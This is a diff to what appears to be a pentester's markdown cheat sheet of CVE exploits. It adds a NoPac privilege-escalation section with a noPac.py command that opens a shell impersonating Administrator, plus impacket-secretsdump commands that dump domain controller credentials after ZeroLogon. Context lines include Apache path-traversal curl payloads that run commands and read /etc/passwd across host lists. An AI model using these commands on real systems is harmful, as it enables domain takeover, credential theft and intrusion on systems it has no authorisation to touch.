@@ -12,6 +12,7 @@
 - [CVE-2020-1472: ZeroLogon LPE](#cve-2020-1472-zerologon-lpe)
 - [CVE-2021–3156: Sudo / sudoedit LPE](#cve-2021-3156-sudo--sudoedit-lpe)
 - [CVE-2021-41773, CVE-2021-42013, CVE-2020-17519: Simples Apache Path Traversal (0-day)](#cve-2021-41773-cve-2021-42013-cve-2020-17519-simples-apache-path-traversal-0-day)
+- [CVE-2021-42287: NoPac LPE](#cve-2021-42287-nopac-lpe)
 - [CVE-2021-43798: Grafana Directory Traversal and Arbitrary File Read (0-day)](#cve-2021-43798-grafana-directory-traversal-and-arbitrary-file-read-0-day)
 - [CVE-2021-44228: Log4Shell RCE (0-day)](#cve-2021-44228-log4shell-rce-0-day)
 - [CVE-2022-0847: Dirty Pipe LPE](#cve-2022-0847-dirty-pipe-lpe)
@@ -320,6 +321,8 @@ $ sudo -u#-1 /bin/bash
 
 > https://github.com/SecuraBV/CVE-2020-1472
 
+> https://github.com/dirkjanm/CVE-2020-1472
+
 > https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py
 
 ### Prerequisites
@@ -453,7 +456,13 @@ if __name__ == '__main__':
 
 ```console
 $ python3 zerologon_tester.py <HANDLE> <RHOST>
-$ secretsdump.py -just-dc -no-pass <HANDLE>\$@<RHOST>
+$ impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
+```
+
+or
+
+```console
+$ impacket-secretsdump '<DOMAIN>'/'<RHOST>$'@<RHOST> -no-pass
 ```
 
 ## CVE-2021-3156: Sudo / sudoedit LPE
@@ -490,6 +499,14 @@ $ curl --data "echo;id" 'http://127.0.0.1:55026/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/
 
 ```console
 $ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
+```
+
+## CVE-2021-42287: NoPac LPE
+
+> https://github.com/Ridter/noPac
+
+```console
+$ python3 noPac.py '<DOMAIN>'/'<USERNAME>':'<PASSWORD>' -dc-ip <RHOST> -shell --impersonate 'Administrator' -use-ldap
 ```
 
 ## CVE-2021-43798: Grafana Directory Traversal and Arbitrary File Read (0-day)
